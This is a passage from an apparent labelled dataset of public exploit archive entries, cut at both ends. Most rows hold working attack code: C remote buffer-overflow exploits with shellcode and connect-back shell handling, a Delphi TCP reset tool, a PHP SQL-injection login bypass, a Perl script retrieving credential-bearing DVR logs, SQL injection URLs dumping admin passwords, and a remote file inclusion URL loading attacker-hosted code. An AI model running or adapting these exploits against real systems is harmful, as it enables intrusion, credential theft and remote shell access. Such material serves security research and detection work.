ssa;  ssock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);  setsockopt(ssock,SOL_SOCKET,SO_REUSEADDR,(void *)&so,sizeof(so)); #ifdef SO_REUSEPORT  setsockopt(ssock,SOL_SOCKET,SO_REUSEPORT,(void *)&so,sizeof(so)); #endif  ssa.sin_family=AF_INET;  ssa.sin_port=htons(port);  ssa.sin_addr.s_addr=INADDR_ANY;  if(bind(ssock,(struct sockaddr *)&ssa,sizeof(ssa))==-1)   printe(""could not bind socket."",1);  listen(ssock,1);   return(ssock); } signed int getshell_bind_accept(signed int ssock){  signed int sock=0;  unsigned int salen=0;  struct sockaddr_in sa;  memset((char*)&sa,0,sizeof(struct sockaddr_in));  salen=sizeof(sa);  printf(""[*] awaiting connection from: *:%d.\n"",tbl.sport);  alarm(TIMEOUT);  sock=accept(ssock,(struct sockaddr *)&sa,&salen);  alarm(0);  close(ssock);  printf(""[*] connection established. (connect-back)\n"");  return(sock); } signed int getshell_conn(char *hostname,unsigned short port){  signed int sock=0;  struct hostent *he;  struct sockaddr_in sa;  if((sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))==-1)   printe(""getshell_conn(): socket() failed."",1);  sa.sin_family=AF_INET;  if((sa.sin_addr.s_addr=inet_addr(hostname))){   if(!(he=gethostbyname(hostname)))    printe(""getshell_conn(): couldn't resolve."",1);   memcpy((char *)&sa.sin_addr,(char *)he->h_addr,   sizeof(sa.sin_addr));  }  sa.sin_port=htons(port);  signal(SIGALRM,sig_alarm);  printf(""[*] attempting to connect: %s:%d.\n"",hostname,port);  alarm(TIMEOUT);  if(connect(sock,(struct sockaddr *)&sa,sizeof(sa))){   printf(""[!] connection failed: %s:%d.\n"",hostname,port);   exit(1);  }  alarm(0);  printf(""[*] successfully connected: %s:%d.\n\n"",hostname,port);  return(sock); } void proc_shell(signed int sock){  signed int r=0;  char buf[4096+1];  fd_set fds;  signal(SIGINT,SIG_IGN);  write(sock,""uname -a;id\n"",13);  while(1){   FD_ZERO(&fds);   FD_SET(0,&fds);   FD_SET(sock,&fds);   if(select(sock+1,&fds,0,0,0)<1)    printe(""getshell(): select() failed."",1);   if(FD_ISSET(0,&fds)){    if((r=read(0,buf,4096))<1)     printe(""getshell(): read() failed."",1);    if(write(sock,buf,r)!=r)     printe(""getshell(): write() failed."",1);   }   if(FD_ISSET(sock,&fds)){    if((r=read(sock,buf,4096))<1)exit(0);    write(1,buf,r);   }  }  close(sock);  return; } void printe(char *err,short e){  printf(""[!] %s\n"",err);  if(e)exit(1);  return; } void usage(char *progname){  printf(""syntax: %s [-pscrln] -h host\n\n"",progname);  printf(""  -h <host/ip>\ttarget hostname/ip.\n"");  printf(""  -p <port>\ttarget port.\n"");  printf(""  -s <port>\tconnect-back/bind port. (shellcode)\n"");  printf(""  -c <host/ip>\tconnect-back host/ip. (enables ""  ""connect-back)\n"");  printf(""  -r <addr>\tdefine return address. (0x%.8x)\n"",tbl.addr);  printf(""  -l <value>\tdistance from the start pointer. (\""GET\"")\n"");  printf(""  -n <offset>\tadds to the overwritten \""kk\"" integer.\n\n"");  exit(0); }  // milw0rm.com [2005-04-14]",HTTPd Remote Buffer Overflow,1
19479,"BSD/OS 3.1/4.0.1 / FreeBSD 3.0/3.1/3.2 / RedHat Linux 6.0 - 'amd' Remote Buffer Overflow (2) // source: https://www.securityfocus.com/bid/614/info   There is a remotely exploitable buffer overflow condition in the amd daemon under several operating systems. Amd is a daemon that automatically mounts filesystems whenever a file or directory within that filesystem is accessed. Filesystems are automatically unmounted when they appear to have become quiescent.   The vulnerability is in the log functions of the daemon.   Red Hat Linux 4.2 shipped originally with a version of amd that is no longer being maintained. Since Red Hat Linux 5.0 we have switched to am-utils. This release of am-utils has been backported to 4.2 and it will obsolete the original 4.2 amd package.  /*   * SDI rpc.AMD automountd remote exploit for RedHat Linux  * Sekure SDI - Brazilian Information Security Team  * by c0nd0r <condor@sekure.org> - Jul/99  *    * AMD doesn't check bounds in the plog() function, so we may  * call the procedure 7 and exploit this vulnerability.  * It has been tested under rh5.2/5.0 but this vulnerability exists in   * all versions.  *   * Greets: jamez, bishop, bahamas, stderr, dumped, paranoia, marty(nordo),  *         vader, fcon, slide, corb, soft distortion and specially to  *         my sasazita!  Also lots of thanks to toxyn.org(frawd,r00t),  *         pulhas.org, phibernet, superbofh(seti) and el8.org (duke).   *         #uground (brasnet), #sdi(efnet), #(phibernet).  *             * usage: SDIamd -h <host> -c <command> [-p <port>] [-o <offset>]  *        where -p <port> will bypass the portmap.  *   * Warning: We take no responsability for the consequences on using this   *          tool. DO NOT USE FOR ILICIT ACTIVITIES!  *  * Agradecimentos a todo o pessoal que vem acompanhando a lista brasileira  * de seguranca - BOS-BR <bos-br-request@sekure.org>. Fiquem ligado na  * nova pagina do grupo!  */   #include <stdio.h> #include <unistd.h> #include <string.h> #include <netdb.h> #include <rpc/rpc.h> #include <sys/time.h> #include <sys/types.h> #include <sys/socket.h>  #define AMQ_PROGRAM ((u_long)300019) #define AMQ_VERSION ((u_long)1) #define AMQPROC_MOUNT ((u_long)7) #define AMQ_STRLEN 1024 #define XDRPROC_T_TYPE xdrproc_t #define voidp void * #define NOP 0x90  char shellcode[] =         ""\xeb\x31\x5e\x89\x76\xac\x8d\x5e\x08\x89\x5e\xb0""         ""\x8d\x5e\x0b\x89\x5e\xb4\x31\xc0\x88\x46\x07\x88""         ""\x46\x0a\x88\x46\xab\x89\x46\xb8\xb0\x0b\x89\xf3""         ""\x8d\x4e\xac\x8d\x56\xb8\xcd\x80\x31\xdb\x89\xd8""         ""\x40\xcd\x80\xe8\xca\xff\xff\xff/bin/sh -c "";  //typedef bool_t (*xdrproc_t) __P ((XDR *, __ptr_t, ...)); typedef char *amq_string; typedef long *time_type; typedef struct amq_mount_tree amq_mount_tree; typedef amq_mount_tree *amq_mount_tree_p;  struct amq_mount_tree {   amq_string mt_mountinfo;   amq_string mt_directory;   amq_string mt_mountpoint;   amq_string mt_type;   time_type mt_mounttime;   u_short mt_mountuid;   int mt_getattr;   int mt_lookup;   int mt_readdir;   int mt_readlink;   int mt_statfs;   struct amq_mount_tree *mt_next;   struct amq_mount_tree *mt_child; };  bool_t xdr_amq_string(XDR *xdrs, amq_string *objp) {   if (!xdr_string(xdrs, objp, AMQ_STRLEN)) {     return (FALSE);   }   return (TRUE); }  bool_t xdr_time_type(XDR *xdrs, time_type *objp) {   if (!xdr_long(xdrs, (long *) objp)) {     return (FALSE);   }   return (TRUE); }  bool_t xdr_amq_mount_tree(XDR *xdrs, amq_mount_tree *objp) {    if (!xdr_amq_string(xdrs, &objp->mt_mountinfo)) {     return (FALSE);   }    if (!xdr_amq_string(xdrs, &objp->mt_directory)) {     return (FALSE);   }    if (!xdr_amq_string(xdrs, &objp->mt_mountpoint)) {     return (FALSE);   }    if (!xdr_amq_string(xdrs, &objp->mt_type)) {     return (FALSE);   }    if (!xdr_time_type(xdrs, &objp->mt_mounttime)) {     return (FALSE);   }    if (!xdr_u_short(xdrs, &objp->mt_mountuid)) {     return (FALSE);   }    if (!xdr_int(xdrs, &objp->mt_getattr)) {     return (FALSE);   }    if (!xdr_int(xdrs, &objp->mt_lookup)) {     return (FALSE);   }    if (!xdr_int(xdrs, &objp->mt_readdir)) {     return (FALSE);   }    if (!xdr_int(xdrs, &objp->mt_readlink)) {     return (FALSE);   }    if (!xdr_int(xdrs, &objp->mt_statfs)) {     return (FALSE);   }    if (!xdr_pointer(xdrs, (char **) &objp->mt_next, sizeof(amq_mount_tree), (XDRPROC_T_TYPE) xdr_amq_mount_tree)) {     return (FALSE);   }    if (!xdr_pointer(xdrs, (char **) &objp->mt_child, sizeof(amq_mount_tree), (XDRPROC_T_TYPE) xdr_amq_mount_tree)) {     return (FALSE);   }    return (TRUE); }  bool_t xdr_amq_mount_tree_p(XDR *xdrs, amq_mount_tree_p *objp) {   if (!xdr_pointer(xdrs, (char **) objp, sizeof(amq_mount_tree), (XDRPROC_T_TYPE) xdr_amq_mount_tree)) {     return (FALSE);   }   return (TRUE); }   int usage ( char *arg) {   printf ( ""Sekure SDI - AMD remote exploit for linux\n"");   printf ( ""usage: %s -h <host> -c <command> [-o <offset>] [-p <port>] [-u] \n"", arg);   printf ( "" where: [port] will bypass portmap\n"");   printf ( ""        [-u  ] will use udp instead of tcp\n"");   exit (0); }   int *amqproc_mount_1(voidp argp, CLIENT *clnt);   int main ( int argc, char *argv[] ) {   CLIENT *cl;   struct timeval tv;   struct sockaddr_in sa;   struct hostent *he;    char buf[8000], *path = buf, comm[200], *host, *cc;   int sd, res, x, y, offset=0, c, port=0, damn=0, udp=0;     long addr = 0xbffff505;    while ((c = getopt(argc, argv, ""h:p:c:o:u"")) != -1)     switch (c) {     case 'h':       host = optarg;       break;      case 'p':       port = atoi(optarg);       break;      case 'c':       cc = optarg;       break;      case 'o':       offset = atoi ( optarg);       break;      case 'u':       udp = 1;       break;      default:       damn = 1;       break;    }    if (!host || !cc || damn) usage ( argv[0]);    sa.sin_family = AF_INET;   he = gethostbyname ( host);   if (!he) {    if ( (sa.sin_addr.s_addr = inet_addr ( host)) == INADDR_NONE) {     printf ( ""unknown host, try again pal!\n"");     exit ( 0);    }   } else     bcopy ( he->h_addr, (struct in_addr *) &sa.sin_addr, he->h_length);    sa.sin_port = htons(port);   sd = RPC_ANYSOCK;   tv.tv_sec = 10;   tv.tv_usec = 0;    snprintf ( comm, sizeof(comm), ""%s"", cc);   if ( strlen(comm) >= 160) {     printf ( ""command too long\n"");     exit (0);   } else {    comm[strlen(comm)] = ';';    for ( x = strlen(comm); x < 160; x++)     comm[x] = 'A';    }      addr += offset;   for ( x = 0; x < (1001-(strlen(shellcode)+strlen(comm))); x++)    buf[x] = NOP;    for ( y = 0; y < strlen(shellcode); x++, y++)    buf[x] = shellcode[y];    for ( y = 0; y < strlen(comm); x++, y++)    buf[x] = comm[y];      printf ( ""SDI automountd remote exploit for linux\n"");   printf ( ""Host %s \nRET 0x%x \nOFFset %d \n"", host, addr, offset);     for ( ; x < 1020; x+=4) {    buf[x  ] = (addr & 0x000000ff);    buf[x+1] = (addr & 0x0000ff00) >> 8;    buf[x+2] = (addr & 0x00ff0000) >> 16;    buf[x+3] = (addr & 0xff000000) >> 24;   }    buf[strlen(buf)] = '\0';        if (!udp) {    if ((cl = clnttcp_create(&sa, AMQ_PROGRAM, AMQ_VERSION, &sd, 0, 0)) ==         NULL)    {      clnt_pcreateerror(""clnt_create"");      exit (-1);    }   } else {    if ((cl = clntudp_create(&sa, AMQ_PROGRAM, AMQ_VERSION, tv, &sd)) ==        NULL)    {      clnt_pcreateerror(""clnt_create"");      exit (-1);    }   }   printf ( ""PORT %d \n"", ntohs(sa.sin_port));   printf ( ""Command: %s \n"", cc);      amqproc_mount_1 (&path, cl);       clnt_destroy ( cl);    }     int * amqproc_mount_1(voidp argp, CLIENT *clnt) {   static int res;   struct timeval TIMEOUT = {10, 0};    memset((char *) &res, 0, sizeof(res));   if (clnt_call(clnt, AMQPROC_MOUNT, (XDRPROC_T_TYPE) xdr_amq_string, argp,                 (XDRPROC_T_TYPE) xdr_int, (caddr_t) & res,                 TIMEOUT) != RPC_SUCCESS) {     printf ( ""voce e' um hax0r!\n"");     printf ( ""don't forget to restart amd: /etc/rc.d/init.d/amd start\n"");     clnt_perror ( clnt, ""clnt_call"");     return (NULL);   }    printf ( ""exploit failed\n"");   return (&res); }",buffer overflow condition,1
7346,"Multiple Membership Script 2.5 - 'id' SQL Injection ================================================   Multiple Membership Script V 2.5 SQL Injection Vulnerability ================================================   ,--^----------,--------,-----,-------^--,   | |||||||||   `--------'     |          O .. Gaza Hacker Team ..   `+---------------------------^----------|     `\_,-------, _________________________|       / XXXXXX /`|     /      / XXXXXX /  `\   /     / XXXXXX /\______(    / XXXXXX /             / XXXXXX /  (________(               `------'  AUTHOR : ViRuS_HaCkErS Email  : h8g@hotmail.com SITE   : gaza-hacker.com  & hacker.ps  ##################################################### ##################################################### ---------  Exploit --------- SQL Injection Vulnerability  http://www.site.com/sitepage.php?id=-15+union+select+1,concat_ws(password,0x3a,username),3,4,5+from+affiliate_admin  sitepage.php?id=-15+union+select+1,concat_ws(password,0x3a,username),3,4,5+from+affiliate_admin http://www.pricelesshost.com/mmsv2/sitepage.php?id=-15+union+select+1,concat_ws(password,0x3a,username),3,4,5+from+affiliate_admin   Login : http://www.site.com/admin  ####################################################################################### Gaza Hacker TeaM : Le0n &  Lito & cLAw & zero cod #######################################################################################  # milw0rm.com [2008-12-05]",SQL Injection,1
276,"Microsoft Windows XP/2000 - TCP Connection Reset { AFX TCP Reset by Aphex http://www.iamaphex.cjb.net unremote@knology.net  Compile with Delphi 5/6/7 }  program Project1;  {$APPTYPE CONSOLE}  uses Windows;  type TBufferArray = array[0..65535] of byte;  type iph = record ip_verlen: byte; ip_tos: byte; ip_len: word; ip_id: word; ip_offset: word; ip_ttl: byte; ip_protocol: byte; ip_checksum: word; ip_saddr: longword; ip_daddr: longword; end;  tcph = record th_sport: word; th_dport: word; th_seq: longword; th_ack: longword; th_len: byte; th_flags: byte; th_win: word; th_checksum: word; th_upr: word; end;  sb = packed record sb1, sb2, sb3, sb4: char; end;  sw = packed record sw1, sw2: word; end;  TInAddr = record case integer of 0: (ssb: sb); 1: (ssw: sw); 2: (saddr: longint); end;  TSockAddr = record case integer of 0: (sin_family: word; sin_port: word; sin_addr: TInAddr; sin_zero: array[0..7] of char); 1: (sa_family: word; sa_data: array[0..13] of char) end;  TWSAData = record ver: Word; hgh: Word; dsc: array[0..256] of char; sys: array[0..128] of char; skt: Word; udp: Word; ven: PChar; end;  function closesocket(sk: integer): integer; stdcall; external 'WS2_32.DLL' name 'closesocket'; function htons(hs: word): word; stdcall; external 'WS2_32.DLL' name 'htons'; function htonl(hs: longint): longint; stdcall; external 'WS2_32.DLL' name 'htonl'; function ntohl(hs: longint): longint; stdcall; external 'WS2_32.DLL' name 'htonl'; function inet_addr(cp: pchar): longint; stdcall; external 'WS2_32.DLL' name 'inet_addr'; function sendto(sk: integer; var bf; ln, fl: integer; var ad: TSockAddr; le: integer):  integer; stdcall; external 'WS2_32.DLL' name 'sendto'; function setsockopt(sk: integer; lv, op: integer; ov: PChar; ol: integer): integer;  stdcall; external 'WS2_32.DLL' name 'setsockopt'; function socket(af, st, pr: integer): integer; stdcall; external 'WS2_32.DLL' name 'socket'; function WSACleanup: integer; stdcall; external 'WS2_32.DLL' name 'WSACleanup' function WSAGetLastError: integer; stdcall; external 'WS2_32.DLL' name 'WSAGetLastError'; function WSAStartup(vr: word; var ws: TWSAData): integer; stdcall; external 'WS2_32.DLL' name 'WSAStartup';  const INVALID_SOCKET = integer(not(0));  var hSocket: integer; WindowPos: int64; WindowCount: dword; WindowSize: dword; TargetHost: string; TargetPort: word; SourceHost: string; SourcePort: word; Odds: dword; Delay: dword;  function CheckSum(var Buffer; Size: integer): word; type TWordArray = Array[0..1] of word; var lSumm: LongWord; iLoop: integer; begin lSumm := 0; iLoop := 0; while Size > 1 do begin lSumm := lSumm + TWordArray(Buffer)[iLoop]; inc(iLoop); Size := Size - SizeOf(word); end; if Size = 1 then lSumm := lSumm + Byte(TWordArray(Buffer)[iLoop]); lSumm := (lSumm shr 16) + (lSumm and $FFFF); lSumm := lSumm + (lSumm shr 16); Result := word(not lSumm); end;  procedure Header(FromIP: string; FromPort: word; ToIP: string; ToPort: word; Seq: longint;  Window: longint; var Buffer: TBufferArray; var Socket: TSockAddr; var Size: word); var ipHdr: iph; tcpHdr: tcph; TcpHeaderLen: word; ChecksumSize: word; DataPointer: ^byte; procedure IncPtr(Value: integer); begin DataPointer := pointer(integer(DataPointer) + Value); end; begin Size := sizeof(ipHdr) + sizeof(tcpHdr); ipHdr.ip_verlen := ((4 shl 4) or sizeof(ipHdr) div sizeof(longword)); ipHdr.ip_tos := 0; ipHdr.ip_len := htons(Size); ipHdr.ip_id := 0; ipHdr.ip_offset := 0; ipHdr.ip_ttl := 128; ipHdr.ip_protocol := 6; ipHdr.ip_checksum := 0; ipHdr.ip_saddr := inet_addr(pchar(FromIP)); ipHdr.ip_daddr := inet_addr(pchar(ToIP)); ChecksumSize := 0; tcpHdr.th_sport := htons(FromPort); tcpHdr.th_dport := htons(ToPort); tcpHdr.th_seq := htonl(Seq); tcpHdr.th_ack := htonl(Seq + Window); tcpHdr.th_len := 80; tcpHdr.th_flags := 20; tcpHdr.th_win := Window; tcpHdr.th_checksum := 0; tcpHdr.th_upr := 0; DataPointer := @Buffer[0]; FillChar(Buffer, SizeOf(Buffer), 0); Move(ipHdr.ip_saddr, DataPointer^, SizeOf(ipHdr.ip_saddr)); IncPtr(SizeOf(ipHdr.ip_saddr)); ChecksumSize := ChecksumSize + sizeof(ipHdr.ip_saddr); Move(ipHdr.ip_daddr, DataPointer^, sizeof(ipHdr.ip_daddr)); IncPtr(SizeOf(ipHdr.ip_daddr)); ChecksumSize := ChecksumSize + sizeof(ipHdr.ip_daddr); IncPtr(1); Inc(ChecksumSize); Move(ipHdr.ip_protocol, DataPointer^, sizeof(ipHdr.ip_protocol)); IncPtr(sizeof(ipHdr.ip_protocol)); ChecksumSize := ChecksumSize + sizeof(ipHdr.ip_protocol); TcpHeaderLen := htons(sizeof(tcpHdr)); Move(TcpHeaderLen, DataPointer^, sizeof(TcpHeaderLen)); IncPtr(sizeof(TcpHeaderLen)); ChecksumSize := ChecksumSize + sizeof(TcpHeaderLen); Move(tcpHdr, DataPointer^, sizeof(tcpHdr)); IncPtr(sizeof(tcpHdr)); ChecksumSize := ChecksumSize + sizeof(tcpHdr); tcpHdr.th_checksum := CheckSum(Buffer, ChecksumSize); FillChar(Buffer, sizeof(Buffer), 0); DataPointer := @Buffer[0]; Move(ipHdr, DataPointer^, sizeof(ipHdr)); IncPtr(sizeof(ipHdr)); Move(tcpHdr, DataPointer^, sizeof(tcpHdr)); Socket.sin_family := 2; Socket.sin_port := htons(0); Socket.sin_addr.saddr := inet_addr(pchar(ToIP)); end;  procedure Send(TargetIP: string; TargetPort: integer; SourceIP: string; SourcePort: integer;  Sequence: longint; Window: longint); var Buffer: TBufferArray; Sck: TSockAddr; Size: Word; begin Header(SourceIP, SourcePort, TargetIP, TargetPort, Sequence, Window, Buffer, Sck, Size); SendTo(hSocket, Buffer, Size, 0, Sck, sizeof(Sck)); end;  procedure Init; var wsdata: TWSAdata; op: integer; begin WSAStartup($0002, wsdata); hSocket := Socket(2, 3, 0); op := 1; SetSockOpt(hSocket, 0, 2, @op, sizeof(op)); end;  function StrToInt(S: string): integer; begin Val(S, Result, Result); end;  procedure DoExit; begin WriteLn('AFX TCP Reset'); WriteLn('http://www.iamaphex.cjb.net'); WriteLn('unremote@knology.net'); WriteLn(''); WriteLn('Usage: reset <src ip> <src port> <dest ip> <dest port> <window size> <send delay> [begin seq num]'); ExitProcess(0); end;  begin if Length(ParamStr(1)) < 1 then DoExit; if Length(ParamStr(2)) < 1 then DoExit; if Length(ParamStr(3)) < 1 then DoExit; if Length(ParamStr(4)) < 1 then DoExit; if Length(ParamStr(5)) < 1 then DoExit; SourceHost := ParamStr(1); SourcePort := StrToInt(ParamStr(2)); TargetHost := ParamStr(3); TargetPort := StrToInt(ParamStr(4)); WindowSize := StrToInt(ParamStr(5)); Delay := StrToInt(ParamStr(6)); Randomize; WindowPos := Random(4294967295); if Length(ParamStr(7)) > 0 then WindowPos := StrToInt(ParamStr(7)); Odds := 4294967295 div WindowSize; WindowCount := 0; Init; while WindowCount < Odds do begin if WindowPos > 4294967295 then WindowPos := 0; Send(TargetHost, TargetPort, SourceHost, SourcePort, WindowPos, WindowSize); Inc(WindowCount); Inc(WindowPos, WindowSize); Sleep(Delay); end; end.  // milw0rm.com [2004-04-22]",TCP Connection Reset,1
28264,Prince Clan Chess Club 0.8 - 'Include.PCchess.php' Remote File Inclusion source: https://www.securityfocus.com/bid/19138/info  Prince Clan Chess Club for Mambo is prone to a remote file-include vulnerability because it fails to properly sanitize user-supplied input.  An attacker can exploit this issue to include arbitrary remote files containing malicious PHP code and execute it in the context of the webserver process. This may allow the attacker to compromise the application and to gain access to the underlying system.  http://www.example.com/[target]/[path]/components/com_pcchess/include.pcchess.php?mosConfig_absolute_path=http://[attacker]/cmd.txt?&cmd=ls,Remote File Inclusion,1
4797,"March Networks DVR 3204 - Logfile Information Disclosure #!/usr/bin/perl # # March Networks DVR 3204 Logfile Information Disclosure Exploit # # Since configuration of the IP address, user console and root is  # carried out over the ""administrator console"", the vulnerability  # lies within Watchdog's HTTP server application. # # Any user can obtain the log files without authentication by accessing # the following PATH http:/dvraddress/scripts/logfiles.tar.gz. The intruder # can then uncompress the tar file and access the config.dat to reveal # username and passwords, names of devices, and IP addresses of other  # security components attached to the corporate networ # # More details:  # http://www.sybsecurity.com/resources/static/ # An_Insecurity_Overview_of_the_March_Networks_DVR-CCTV_3204.pdf # # By Alex Hernandez ahernandez [at] sybsecurity [dot] com # # Usage: perl -x dvr3204_exp.pl www.marchnetworks.com:80 # Usage: perl -x dvr3204_exp.pl 127.0.0.1:80 # # $ perl -x dvr3204_exp.pl 10.50.10.246:80 # Trying... # # THIS HOST IS VULNERABLE!!! :-) # Check the details on w w w [dot] sybsecurity [dot] c o m # # THIS HOST IS NOT VULNERABLE :-( # Check the settings on browser... # #   use Socket;  if ($#ARGV<0) {die "" \nMarch Networks DVR 3204 exploit\n More details: http://www.sybsecurity.com By Alex Hernandez\n  ahernandez [at] sybsecurity [dot] com\n  Usage: perl -x $0 www.marchnetworks.com:80 Usage: perl -x $0 127.0.0.1:80\n\n"";}  ($host,$port)=split(/:/,@ARGV[0]);  print ""Trying...\n\n""; $target = inet_aton($host); $flag=0;  my @results=sendraw(""GET /Level1Authenticate.htm HTTP/1.0\r\n\r\n""); foreach $line (@results){  if ($line =~ /Directory/) {$flag=1;}}  my @results=sendraw(""GET /UserAuthenticate.htm HTTP/1.0\r\n\r\n""); foreach $line (@results){  if ($line =~ /Directory/) {$flag=1;}}  my @results=sendraw(""GET /public/index.htm HTTP/1.0\r\n\r\n""); foreach $line (@results){  if ($line =~ /Directory/) {$flag=1;}}  my @results=sendraw(""GET /public/UpgradeStatus.htm HTTP/1.0\r\n\r\n""); foreach $line (@results){  if ($line =~ /Directory/) {$flag=1;}}  my @results=sendraw(""GET /public/UpgradeHistory.htm HTTP/1.0\r\n\r\n""); foreach $line (@results){  if ($line =~ /Directory/) {$flag=1;}}  my @results=sendraw(""GET /public/UpgradeHistory.txt HTTP/1.0\r\n\r\n""); foreach $line (@results){  if ($line =~ /Directory/) {$flag=1;}}  my @results=sendraw(""GET /public/dvrlog HTTP/1.0\r\n\r\n""); foreach $line (@results){  if ($line =~ /Directory/) {$flag=1;}}  my @results=sendraw(""GET /scripts/logfiles.tar.gz HTTP/1.0\r\n\r\n""); foreach $line (@results){  if ($line =~ /Directory/) {$flag=1;}}  if ($flag==1){print ""THIS HOST IS VULNERABLE!!! :-)\n Check the details on www [dot] sybsecurity [dot] com\n"";} else {print ""THIS HOST IS NOT VULNERABLE :-( \n Check the settings on browser...\n"";}  sub sendraw {         my ($pstr)=@_;         socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp')||0) ||                 die(""Socket problems\n"");         if(connect(S,pack ""SnA4x8"",2,$port,$target)){                 my @in;                 select(S); $|=1; print $pstr;                 while(<S>){ push @in, $_;}                 select(STDOUT); close(S); return @in;         } else { die(""Can't connect check the port or address...\n""); } }  # milw0rm.com [2007-12-27]",Logfile Information Disclosure,1
6991,"TR News 2.1 - 'login.php' Remote Authentication Bypass <?php  error_reporting(0);  /*    ------------------------------------------------------    TR News <= 2.1 (login.php) Remote Login ByPass Exploit    ------------------------------------------------------    By StAkeR[at]hotmail[dot]it    http://www.easy-script.com/scripts-dl/trscript-21.zip     File admin/login.php        1. <?    2.	if(isset($_POST['login_ad']) && ($_POST['password']))    3.   {    4.	include(""../include/connexion.php"");    5.	$login=$_POST[""login_ad""];    6.	$pass=md5($_POST[""password""]);    7.	$sql=""SELECT * FROM tr_user_news WHERE pseudo='$login' AND pass='$pass';"";    8.	$p = mysql_query($sql);    9.	$row = mysql_fetch_assoc($p);   10.	$admin = $row['admin'];   11.	if($admin != 1)      $login = $_POST""login_ad""]; isn't escaped,so you can insert SQL code...   how to fix? sanize $login with mysql_real_escape_string or htmlentities         NOTE:      if the website is vulnerable,you must go to admin/login.php      Username: ' or 1=1#   Password: no-deface    */  if(preg_match('/http://(.+?)/i',$argv[1]) or empty($argv[1])) athos();  $host = explode('/',$argv[1]); $auth = ""login_ad=%27+or+1%3D1%23&password=athos"";   $data = ""POST /$host[1]/admin/login.php HTTP/1.1\r\n"".          ""Host: $host[0]\r\n"".         ""Content-Type: application/x-www-form-urlencoded\r\n"".         ""Content-Length: "".strlen($auth).""\r\n\r\n"".         ""$auth\r\n\r\n"";       if(!$socket = fsockopen($host[0],80)) die(""fsockopen() error!\n"");   if(!fputs($socket,$data)) die(""fputs() error!\n"");   while(!feof($socket)) {   $content .= fgets($socket); } fclose($socket);  if(preg_match(""/location: main\.php\?mode=main/i"",$content)) {   exploiting();   echo ""\n[+] Exploit Successfully!\n[+] Site Vulnerable\n"";   exit; } else {   exploiting();   echo ""\n[+] Exploit Failed!\n[+] Site Not Vulnerable!\n"";   exit; }    function athos() {   global $argv;      echo ""[+] TR News <= 2.1 (login.php) Remote Login ByPass Exploit\n"";   echo ""[+] Usage: php $argv[0] [host/path]\r\n"";   exit; }    function exploiting() {   echo ""[+] Exploiting"";    for($i=0;$i<=3;$i++)    {     echo ""."";      sleep(1);   } }    # milw0rm.com [2008-11-04]",Remote Authentication Bypass,1
5458,"Xine-Lib 1.1.12 - NSF demuxer Stack Overflow (PoC) xine-lib <= 1.1.12 is prone to a stack-based buffer overflow in the NES  Sound Format demuxer(demux_nsf.c).   - Code  open_nsf_file():  109: this->title = strdup(&header[0x0E]);  demux_nsf_send_chunk():  122: char title[100]; 162: sprintf(title, ""%s, song %d/%d"",             this->title, this->current_song, this->total_songs);   - Affected applications  http://xinehq.de/index.php/releases   - PoC  perl -e 'print  ""\x4E\x45\x53\x4D\x1A\x01\x01\x01\x80\x80\x18\x8A\x03\x8A"" . ""\x41"" x  114' > evil.mp3  # milw0rm.com [2008-04-16]",stack-based buffer overflow,1
36248,"osCommerce - Arbitrary File Upload / File Disclosure source: https://www.securityfocus.com/bid/50301/info  osCommerce is prone to a remote file upload and a file disclosure vulnerability. The issues occur because the application fails to adequately sanitize user-supplied input.  An attacker can exploit these issues to upload a file and obtain an arbitrary file's content; other attacks are also possible.   The following URL is available for the file disclosure vulnerability:  http://www.example.com/admin/shop_file_manager.php/login.php/login.php?action=download&filename=/includes/_includes_configure.php  The following exploit is available for the remote file upload vulnerability:   <html><head><title> creloaded - Remote File Upload </title></head> <br><br><u>UPLOAD FILE:</u><br> <form name=""file"" action=""https://www.example.com/admin/shop_file_manager.php/login.php?action=processuploads"" method=""post"" enctype=""multipart/form-data""> <input type=""file"" name=""file_1""><br> <input name=""submit"" type=""submit"" value="" Upload "" > </form> <br><u>CREATE FILE:</u><br> <form name=""new_file"" action=""https://www.example.com/admin/shop_file_manager.php/login.php?action=save"" method=""post""> FILE NAME:<br> <input type=""text"" name=""filename"">&nbsp; (ex. shell.php)<br>FILE CONTENTS:<br> <textarea name=""file_contents"" wrap=""soft"" cols=""70"" rows=""10"">&lt;/textarea&gt; <input name=""submit"" type=""submit"" value="" Save "" > </form>",Arbitrary File Upload /,1
22853,"WordPress Plugin Facebook Survey 1.0 - SQL Injection Title: ====== Wordpress Facebook Survey v1 - SQL Injection Vulnerability   Date: ===== 2012-11-18   References: =========== http://www.vulnerability-lab.com/get_content.php?id=766   VL-ID: ===== 766   Common Vulnerability Scoring System: ==================================== 8.5   Introduction: ============= Wordpress Facebook Survey Pro is an easy to install & use Wordpress plugin. Get started right away, and set up as many timeline optin pages as you want. This plugin gets to the point, and makes it so  you get the BEST answers from your FB fans. You can add a custom success page so you can offer  incentives for your fans to complete the survey. It`s the BEST way to get feedback!  (Copy of the Vendor Homepage: http://fbsurveypro.com/ )   Abstract: ========= The Vulnerability Laboratory Research Team discovered a critical remote SQL Injection vulnerability in the Wordpress Facebook Survey Pro Plugin.   Report-Timeline: ================ 2012-11-18:	Public Disclosure   Status: ======== Published   Exploitation-Technique: ======================= Remote   Severity: ========= Critical   Details: ======== A blind SQL Injection vulnerability is detected in the commercial Wordpress Facebook Survey Pro Plugin. The vulnerability allows an attacker (remote) or local low privileged user account to execute a SQL  commands on the affected application dbms. The blind sql injection vulnerability is located in index.php  file (timeline module) with the bound vulnerable id parameter. Successful exploitation of the vulnerability  results in dbms & application compromise. Exploitation requires no user interaction & without privileged  application user account.  Vulnerable Module(s): 				[+] timeline/  Vulnerable File(s): 				[+] index.php  Vulnerable Parameter(s): 				[+] id   Proof of Concept: ================= The SQL injection vulnerability can be exploited by remote attackers without privileged application user accounr and without  required user inter action. For demonstration or reproduce ...  PoC: http://[SERVER]/[WORDPRESS]/wp-content/plugins/plugin-dir/timeline/index.php?id=1'-1 union select 1,2,3,4,5[SQL-Injection]--   Solution: ========= Filter the id input, or use the intval() php function to make sure the input is an integer.   Risk: ===== The security risk of the remote blind sql injection vulnerability is estimated as critical.   Credits: ======== Vulnerability Laboratory [Research Team] - Chokri B.A. (meister@vulnerability-lab.com)   Disclaimer: =========== The information provided in this advisory is provided as it is without any warranty. Vulnerability-Lab disclaims all warranties,  either expressed or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability- Lab or its suppliers are not liable in any case of damage, including direct, indirect, incidental, consequential loss of business  profits or special damages, even if Vulnerability-Lab or its suppliers have been advised of the possibility of such damages. Some  states do not allow the exclusion 